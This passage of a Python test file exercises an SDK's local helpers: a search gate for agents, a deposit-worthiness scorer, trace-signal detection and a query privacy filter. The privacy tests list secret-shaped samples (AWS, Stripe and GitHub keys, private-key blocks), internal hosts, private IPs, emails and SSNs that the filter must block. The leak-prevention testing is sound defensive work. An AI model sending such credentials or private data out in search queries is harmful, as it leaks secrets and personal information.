        client.close()


# ──────────────────────────────────────────────────────────────────────────
# Local Decision Helpers (v1.0+) — pure functions, no network
# ──────────────────────────────────────────────────────────────────────────


class TestShouldSearch:
    """``should_search(signals)`` — local gate for calling search."""

    def test_no_signals_returns_false(self):
        from inferior import TaskSignals
        assert InferiorClient.should_search(TaskSignals()) is False

    def test_error_shaped_triggers(self):
        from inferior import TaskSignals
        assert InferiorClient.should_search(TaskSignals(is_error_shaped=True)) is True

    def test_high_stakes_triggers(self):
        from inferior import TaskSignals
        assert InferiorClient.should_search(TaskSignals(is_high_stakes=True)) is True

    def test_unfamiliar_triggers(self):
        from inferior import TaskSignals
        assert InferiorClient.should_search(TaskSignals(is_unfamiliar=True)) is True

    def test_long_commitment_triggers(self):
        from inferior import TaskSignals
        assert InferiorClient.should_search(TaskSignals(is_long_commitment=True)) is True

    def test_regulatory_triggers(self):
        from inferior import TaskSignals
        assert InferiorClient.should_search(TaskSignals(is_regulatory=True)) is True

    def test_stuck_signal_requires_both(self):
        from inferior import TaskSignals
        # Only failed attempts, no elapsed time → no trigger.
        assert (
            InferiorClient.should_search(TaskSignals(failed_attempts=3, elapsed_minutes=2.0))
            is False
        )
        # Only elapsed time, no failures → no trigger.
        assert (
            InferiorClient.should_search(TaskSignals(failed_attempts=0, elapsed_minutes=10.0))
            is False
        )
        # Both → trigger.
        assert (
            InferiorClient.should_search(TaskSignals(failed_attempts=1, elapsed_minutes=5.0))
            is True
        )

    def test_trivial_overrides_error_shaped(self):
        from inferior import TaskSignals
        assert (
            InferiorClient.should_search(
                TaskSignals(is_error_shaped=True, is_trivial=True)
            )
            is False
        )

    def test_creative_overrides_high_stakes(self):
        from inferior import TaskSignals
        assert (
            InferiorClient.should_search(
                TaskSignals(is_high_stakes=True, is_creative=True)
            )
            is False
        )

    def test_proprietary_closed_overrides_all_triggers(self):
        from inferior import TaskSignals
        s = TaskSignals(
            is_error_shaped=True,
            is_high_stakes=True,
            is_unfamiliar=True,
            failed_attempts=5,
            elapsed_minutes=60.0,
            is_proprietary_closed=True,
        )
        assert InferiorClient.should_search(s) is False

    def test_each_anti_trigger_individually_skips(self):
        from inferior import TaskSignals
        for field in (
            "is_trivial",
            "is_creative",
            "repeat_within_session",
            "is_near_zero_coverage",
            "is_proprietary_closed",
            "is_latency_sensitive",
            "is_mid_fragment",
        ):
            kwargs = {"is_error_shaped": True, field: True}
            assert InferiorClient.should_search(TaskSignals(**kwargs)) is False, field

    def test_can_be_called_on_instance(self):
        from inferior import TaskSignals
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        assert client.should_search(TaskSignals(is_error_shaped=True)) is True
        client.close()


class TestDepositWorthiness:
    """``deposit_worthiness(draft)`` — local gate for depositing."""

    def _good_draft(self, **overrides):
        from inferior import DepositDraft
        base = DepositDraft(
            title="Fix stripe webhook on vercel edge",
            problem="Webhook signature validation fails on edge runtime.",
            root_cause=(
                "Edge runtime strips the raw body buffer required by the "
                "HMAC signature verification; the request arrives with a "
                "re-parsed body that no longer matches the signature."
            ),
            insight="Signature-verified webhooks need byte-exact raw body.",
            successful_approach_method="Switch runtime to nodejs in vercel.json",
            tags=["stripe", "vercel", "webhook"],
            failed_approaches=[{"attempt": "raw-body npm", "why_it_failed": "incompatible"}],
            applies_when=["Vercel edge + Stripe webhook"],
            does_not_apply_when=["Vercel nodejs (non-edge) runtime"],
            evidence_class="production_validated",
            has_been_verified=True,
        )
        for k, v in overrides.items():
            setattr(base, k, v)
        return base

    def test_good_draft_passes(self):
        from inferior import WorthResult
        result = InferiorClient.deposit_worthiness(self._good_draft())
        assert isinstance(result, WorthResult)
        assert result.should_deposit is True
        assert result.score == 1.0
        assert result.failed_dimensions == []

    def test_short_root_cause_fails_causal_depth(self):
        result = InferiorClient.deposit_worthiness(self._good_draft(root_cause="Edge bug"))
        assert result.should_deposit is False
        assert "causal_depth" in result.failed_dimensions

    def test_root_cause_restates_problem_fails(self):
        result = InferiorClient.deposit_worthiness(
            self._good_draft(
                problem="Connection refused on postgres",
                root_cause="Connection refused on postgres",
            )
        )
        assert result.should_deposit is False
        assert "causal_depth" in result.failed_dimensions

    def test_empty_does_not_apply_when_fails_boundary(self):
        result = InferiorClient.deposit_worthiness(
            self._good_draft(does_not_apply_when=[])
        )
        assert result.should_deposit is False
        assert "boundary_precision" in result.failed_dimensions

    def test_missing_evidence_class_fails_evidence(self):
        result = InferiorClient.deposit_worthiness(self._good_draft(evidence_class=None))
        assert result.should_deposit is False
        assert "evidence" in result.failed_dimensions

    def test_inflated_evidence_class_fails(self):
        result = InferiorClient.deposit_worthiness(
            self._good_draft(
                evidence_class="production_validated",
                has_been_verified=False,
            )
        )
        assert result.should_deposit is False
        assert "evidence" in result.failed_dimensions

    def test_speculative_with_unverified_is_ok(self):
        # "speculative" is honest when unverified.
        result = InferiorClient.deposit_worthiness(
            self._good_draft(
                evidence_class="speculative",
                has_been_verified=False,
            )
        )
        assert result.should_deposit is True

    def test_trivial_fix_flag_fails_non_trivial(self):
        result = InferiorClient.deposit_worthiness(self._good_draft(is_trivial_fix=True))
        assert result.should_deposit is False
        assert "non_trivial" in result.failed_dimensions

    def test_score_drops_per_failed_dimension(self):
        # Fail two dimensions: causal + boundary.
        result = InferiorClient.deposit_worthiness(
            self._good_draft(root_cause="x", does_not_apply_when=[])
        )
        assert result.should_deposit is False
        assert result.score == 0.5
        assert set(result.failed_dimensions) == {"causal_depth", "boundary_precision"}

    def test_soft_nudges_do_not_block(self):
        # Missing failed_approaches is soft — still passes if everything else is OK.
        result = InferiorClient.deposit_worthiness(
            self._good_draft(failed_approaches=[])
        )
        assert result.should_deposit is True
        # But a soft reason is emitted.
        assert any(r.startswith("(soft)") for r in result.reasons)

    def test_to_deposit_kwargs_roundtrips(self):
        draft = self._good_draft()
        kwargs = draft.to_deposit_kwargs()
        assert kwargs["title"] == draft.title
        assert kwargs["solution"] == draft.successful_approach_method
        assert kwargs["does_not_apply_when"] == draft.does_not_apply_when
        assert kwargs["evidence_class"] == "production_validated"


class TestIsQuerySafe:
    """``is_query_safe(query, policy)`` — local privacy gate."""

    def test_clean_query_is_safe(self):
        from inferior import QuerySafetyResult
        result = InferiorClient.is_query_safe("how to fix kubernetes ingress 502")
        assert isinstance(result, QuerySafetyResult)
        assert result.is_safe is True
        assert result.reasons == []

    def test_aws_key_blocked(self):
        result = InferiorClient.is_query_safe(
            "this fails with AKIAIOSFODNN7EXAMPLE aws_access_key in the config"
        )
        assert result.is_safe is False
        assert any("secret" in r.lower() for r in result.reasons)

    def test_stripe_live_key_blocked(self):
        result = InferiorClient.is_query_safe(
            "using sk_live_abcdefghijklmnop causes a failure"
        )
        assert result.is_safe is False

    def test_github_pat_blocked(self):
        result = InferiorClient.is_query_safe(
            "ghp_ABCDEFGHIJKLMNOP exits early when used for clone"
        )
        assert result.is_safe is False

    def test_private_key_block(self):
        result = InferiorClient.is_query_safe(
            "-----BEGIN RSA PRIVATE KEY-----\nxyz\n-----END RSA PRIVATE KEY-----"
        )
        assert result.is_safe is False

    def test_internal_host_blocked(self):
        result = InferiorClient.is_query_safe("api.svc.internal returns 500")
        assert result.is_safe is False
        assert any("internal" in r.lower() for r in result.reasons)

    def test_private_ip_blocked(self):
        for ip in ("10.0.1.2", "192.168.1.1", "172.16.0.5"):
            result = InferiorClient.is_query_safe(f"connect to {ip} fails")
            assert result.is_safe is False, ip

    def test_email_blocked(self):
        result = InferiorClient.is_query_safe(
            "user@example.com cannot log in, traceback shows 500"
        )
        assert result.is_safe is False
        assert any("email" in r.lower() for r in result.reasons)

    def test_ssn_blocked(self):
        result = InferiorClient.is_query_safe("123-45-6789 record missing from export")
        assert result.is_safe is False

    def test_max_length_blocked(self):
        from inferior import QueryPolicy
        policy = QueryPolicy(max_length=50)
        result = InferiorClient.is_query_safe("x" * 100, policy)
        assert result.is_safe is False
        assert any("max_length" in r for r in result.reasons)

    def test_custom_deny_pattern(self):
        from inferior import QueryPolicy
        policy = QueryPolicy(custom_deny_patterns=[r"SECRET_CODE"])
        result = InferiorClient.is_query_safe("hits SECRET_CODE branch", policy)
        assert result.is_safe is False

    def test_invalid_custom_pattern_ignored(self):
        from inferior import QueryPolicy
        policy = QueryPolicy(custom_deny_patterns=[r"["])  # invalid regex
        # Should not raise.
        result = InferiorClient.is_query_safe("some query", policy)
        assert result.is_safe is True

    def test_relaxed_policy(self):
        from inferior import QueryPolicy
        policy = QueryPolicy(
            block_secrets=False,
            block_internal_hosts=False,
            block_customer_data=False,
        )
        result = InferiorClient.is_query_safe(
            "connecting to api.svc.internal with sk_live_abc", policy
        )
        assert result.is_safe is True


# ──────────────────────────────────────────────────────────────────────────
# Worthiness Framework (v1.2+) — execution traces, 5-dim preview, search signals
# ──────────────────────────────────────────────────────────────────────────


class TestDetectDepositSignals:
    """``detect_deposit_signals(trace)`` — framework Phase 1, domain-agnostic."""

    def test_empty_trace_returns_no_signals(self):
        from inferior import ExecutionTrace
        signals = InferiorClient.detect_deposit_signals(ExecutionTrace())
        assert signals == []

    def test_tool_error_then_success_fires_error_recovery(self):
        from inferior import ExecutionTrace, ToolCallEvent
        trace = ExecutionTrace(
            tool_calls=[
                ToolCallEvent(name="npm_install", outcome="error"),
                ToolCallEvent(name="edit_package", outcome="success"),
                ToolCallEvent(name="npm_install", outcome="success"),
            ],
            outcome="success",
        )
        signals = InferiorClient.detect_deposit_signals(trace)
        types = {s.type for s in signals}
        assert "error_recovery" in types

    def test_output_rejected_then_accepted_fires_output_rejection_recovery(self):
        # Non-coding scenario: writing / design agent.
        from inferior import ExecutionTrace, OutputEvent
        trace = ExecutionTrace(
            outputs=[
                OutputEvent(
                    content_summary="draft v1",
                    accepted=False,
                    user_feedback="too formal, reword it",
                    index=0,
                ),
                OutputEvent(
                    content_summary="draft v2",
                    accepted=True,
                    index=1,
                ),
            ],
            outcome="success",
        )
        signals = InferiorClient.detect_deposit_signals(trace)
        types = {s.type for s in signals}
        assert "output_rejection_recovery" in types
        assert "error_recovery" in types  # broadened signal 1 also fires

    def test_high_retry_fires_on_repeated_goal(self):
        from inferior import ExecutionTrace, ToolCallEvent
        trace = ExecutionTrace(
            tool_calls=[
                ToolCallEvent(name="lint", outcome="error"),
                ToolCallEvent(name="lint", outcome="error"),
                ToolCallEvent(name="lint", outcome="success"),
            ],
            outcome="success",
        )
        signals = InferiorClient.detect_deposit_signals(trace)
        types = {s.type for s in signals}
        assert "high_retry" in types

    def test_plan_deviation_fires_when_first_and_last_differ(self):
        from inferior import ExecutionTrace, ToolCallEvent
        trace = ExecutionTrace(
            tool_calls=[
                ToolCallEvent(name="add_index", outcome="success"),
                ToolCallEvent(name="rewrite_query", outcome="success"),
            ],
            outcome="success",
        )
        signals = InferiorClient.detect_deposit_signals(trace)
        types = {s.type for s in signals}
        assert "plan_deviation" in types

    def test_human_correction_in_user_message(self):
        from inferior import ExecutionTrace, UserMessageEvent
        trace = ExecutionTrace(
            user_messages=[
                UserMessageEvent(content="please draft a memo", index=0),
                UserMessageEvent(content="actually, reword that, too formal", index=2),
            ],
            outcome="success",
        )
        signals = InferiorClient.detect_deposit_signals(trace)
        types = {s.type for s in signals}
        assert "human_correction" in types

    def test_search_miss_fires_on_zero_result_then_success(self):
        from inferior import ExecutionTrace, SearchQueryEvent
        trace = ExecutionTrace(
            searches_performed=[
                SearchQueryEvent(query="obscure fix", result_count=0, top_score=0.0),
            ],
            outcome="success",
        )
        signals = InferiorClient.detect_deposit_signals(trace)
        types = {s.type for s in signals}
        assert "search_miss" in types


class TestDetectSearchSignals:
    """``detect_search_signals(trace)`` — search-side signals."""

    def test_error_state_fires_from_tool_errors(self):
        from inferior import ExecutionTrace, ToolCallEvent
        trace = ExecutionTrace(
            tool_calls=[ToolCallEvent(name="npm_install", outcome="error")],
        )
        signals = InferiorClient.detect_search_signals(trace)
        types = {s.type for s in signals}
        assert "error_state" in types

    def test_output_rejection_state_fires_from_rejected_output(self):
        from inferior import ExecutionTrace, OutputEvent
        trace = ExecutionTrace(
            outputs=[
                OutputEvent(content_summary="draft", accepted=False, user_feedback="redo")
            ],
        )
        signals = InferiorClient.detect_search_signals(trace)
        types = {s.type for s in signals}
        assert "output_rejection_state" in types

    def test_user_warning_fires_on_correction_language(self):
        from inferior import ExecutionTrace, UserMessageEvent
        trace = ExecutionTrace(
            user_messages=[
                UserMessageEvent(content="ok", index=0),
                UserMessageEvent(content="actually, redo that", index=3),
            ],
        )
        signals = InferiorClient.detect_search_signals(trace)
        types = {s.type for s in signals}
        assert "user_warning" in types


class TestShouldSearchExtended:
    """v1.2+ extensions to should_search."""

    def test_trace_derives_is_error_shaped(self):
        from inferior import ExecutionTrace, TaskSignals, ToolCallEvent
        trace = ExecutionTrace(
            tool_calls=[ToolCallEvent(name="x", outcome="error")],
        )
        assert InferiorClient.should_search(TaskSignals(), trace) is True

    def test_has_rejected_output_triggers(self):
        from inferior import TaskSignals
        assert (
            InferiorClient.should_search(
                TaskSignals(has_rejected_output_this_session=True)
            )
            is True
        )

    def test_repeated_pattern_triggers(self):
        from inferior import TaskSignals
        assert (
            InferiorClient.should_search(TaskSignals(is_repeated_pattern=True))
            is True
        )

    def test_user_warning_triggers(self):
        from inferior import TaskSignals
        assert (
            InferiorClient.should_search(TaskSignals(user_message_has_warning=True))
            is True
        )

    def test_search_budget_blocks_when_exceeded(self):
        from inferior import TaskSignals
        import warnings
        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")
            result = InferiorClient.should_search(
                TaskSignals(is_error_shaped=True, searches_this_session=2)
            )
        assert result is False
        assert any("budget" in str(x.message).lower() for x in w)

    def test_search_budget_disabled_when_limit_zero(self):
        from inferior import TaskSignals
        original = InferiorClient.MID_SESSION_SEARCH_LIMIT
        try:
            InferiorClient.MID_SESSION_SEARCH_LIMIT = 0
            result = InferiorClient.should_search(
                TaskSignals(is_error_shaped=True, searches_this_session=100)
            )
            assert result is True
        finally:
            InferiorClient.MID_SESSION_SEARCH_LIMIT = original


class TestFormSearchQuery:
    """``form_search_query(draft, context)`` — framework Phase 2 for search."""

    def test_usable_query_with_tech_stack_and_versions(self):
        from inferior import SearchQueryContext
        result = InferiorClient.form_search_query(
            "webhook fail",
            SearchQueryContext(
                tech_stack=["stripe", "vercel"],
                versions={"stripe": "14.0"},
            ),
        )
        assert result.is_usable is True
        assert "stripe" in result.formed_query
        assert "14.0" in result.formed_query
        assert result.word_count >= 3

    def test_too_short_query_is_unusable(self):
        result = InferiorClient.form_search_query("fail", None)
        assert result.is_usable is False
        assert result.word_count < 3

    def test_empty_query_unusable(self):
        result = InferiorClient.form_search_query("", None)
        assert result.is_usable is False

    def test_appends_error_message_when_safe(self):
        from inferior import SearchQueryContext
        result = InferiorClient.form_search_query(
            "connection failing",
            SearchQueryContext(error_message="ECONNREFUSED on default port"),
        )
        assert "ECONNREFUSED" in result.formed_query

    def test_skips_error_message_when_it_contains_secret(self):
        from inferior import SearchQueryContext
        result = InferiorClient.form_search_query(
            "auth failing",
            SearchQueryContext(error_message="using sk_live_secret_abc broke"),
        )
        # Secret stripped silently — the formed query shouldn't contain it.
        assert "sk_live" not in result.formed_query


class TestWorthinessPreview:
    """v1.2+ extension of deposit_worthiness with 5-dim preview."""

    def _good_draft(self, **overrides):
        from inferior import DepositDraft
        base = DepositDraft(
            title="Fix stripe webhook on vercel edge",
            problem="Signature validation fails on edge runtime.",
            root_cause=(
                "Edge runtime strips the raw body buffer required by the HMAC "
                "signature verification."
            ),
            insight="Signature-verified webhooks need byte-exact raw body.",
            successful_approach_method="Switch runtime to nodejs",
            tags=["stripe", "vercel"],
            failed_approaches=[{"attempt": "raw-body npm", "why_it_failed": "incompatible"}],
            applies_when=["Vercel edge + Stripe webhook"],
            does_not_apply_when=["Vercel nodejs (non-edge) runtime"],
            evidence_class="production_validated",
            has_been_verified=True,
        )
        for k, v in overrides.items():
            setattr(base, k, v)
        return base

    def test_preview_populated_for_good_draft(self):
        result = InferiorClient.deposit_worthiness(self._good_draft())
        assert set(result.dimension_scores.keys()) == {
            "novelty", "transferability", "consequence", "evidence", "recurrence",
        }
        assert 0 <= result.estimated_server_score <= 1.0
        # Default self_report is "unknown" — novelty scored 0.5.
        assert result.dimension_scores["novelty"] == 0.5
        assert result.dimension_confidence["novelty"] == "unknown"

    def test_searched_and_none_found_boosts_novelty(self):
        draft = self._good_draft(novelty_self_report="searched_and_none_found")
        result = InferiorClient.deposit_worthiness(draft)
        assert result.dimension_scores["novelty"] >= 0.7

    def test_searched_and_similar_found_penalises_novelty(self):
        draft = self._good_draft(novelty_self_report="searched_and_similar_found")
        result = InferiorClient.deposit_worthiness(draft)
        assert result.dimension_scores["novelty"] <= 0.3
        assert result.would_likely_accept is False

    def test_search_miss_signal_boosts_score(self):
        from inferior import Signal
        draft = self._good_draft()
        without_signals = InferiorClient.deposit_worthiness(draft)
        with_miss = InferiorClient.deposit_worthiness(
            draft,
            signals_fired=[
                Signal(type="search_miss", count=1, evidence="zero hits"),
            ],
        )
        assert with_miss.estimated_server_score > without_signals.estimated_server_score

    def test_evidence_class_honest_scores_high(self):
        draft = self._good_draft(evidence_class="production_validated")
        result = InferiorClient.deposit_worthiness(draft)
        assert result.dimension_scores["evidence"] == 1.0

    def test_evidence_class_inflated_scores_low(self):
        draft = self._good_draft(
            evidence_class="production_validated",
            has_been_verified=False,
        )
        result = InferiorClient.deposit_worthiness(draft)
        assert result.dimension_scores["evidence"] <= 0.3

    def test_empty_does_not_apply_when_hurts_transferability(self):
        draft = self._good_draft(does_not_apply_when=[])
        result = InferiorClient.deposit_worthiness(draft)
        assert result.dimension_scores["transferability"] <= 0.3
        assert result.should_deposit is False  # hard-gate also fails

    def test_recurrence_self_report_scales(self):
        small = self._good_draft(recurrence_self_report=0)
        large = self._good_draft(recurrence_self_report=10)
        r_small = InferiorClient.deposit_worthiness(small)
        r_large = InferiorClient.deposit_worthiness(large)
        assert r_large.dimension_scores["recurrence"] > r_small.dimension_scores["recurrence"]

    def test_preview_backward_compatible_with_existing_fields(self):
        # Existing callers using only score / should_deposit / failed_dimensions still work.
        result = InferiorClient.deposit_worthiness(self._good_draft())
        assert result.should_deposit is True
        assert result.score == 1.0
        assert result.failed_dimensions == []


class TestWorthinessPreviewModuleDirect:
    """Test the shared _worthiness module directly for parity with server."""

    def test_compose_with_default_weights(self):
        from inferior._worthiness import DEFAULT_WEIGHTS, compose_worthiness
        # Verify weights sum to 1.0.
        assert abs(sum(DEFAULT_WEIGHTS.values()) - 1.0) < 1e-9
        scores = {d: 1.0 for d in DEFAULT_WEIGHTS}
        assert compose_worthiness(scores) == 1.0
        scores_zero = {d: 0.0 for d in DEFAULT_WEIGHTS}
        assert compose_worthiness(scores_zero) == 0.0

    def test_compose_missing_dimension_uses_neutral(self):
        from inferior._worthiness import compose_worthiness
        # Missing dimensions default to 0.5.
        result = compose_worthiness({})
        # With all defaulting to 0.5 × weights summing to 1.0 → 0.5.
        assert result == 0.5

    def test_signal_boost_cap(self):
        from inferior import DepositDraft, Signal
        from inferior._worthiness import apply_signal_boosts
        draft = DepositDraft(
            failed_approaches=[{"a": "1"}, {"a": "2"}, {"a": "3"}],
        )
        signals = [
            Signal(type="search_miss"),
            Signal(type="human_correction"),
            Signal(type="error_recovery"),
            Signal(type="high_retry"),
        ]
        # Starting at 0.9, we'd add 0.15 + 0.10 + 0.10 + 0.05 = 0.4 → cap at 1.0.
        boosted, _ = apply_signal_boosts(0.9, signals, draft)
        assert boosted == 1.0
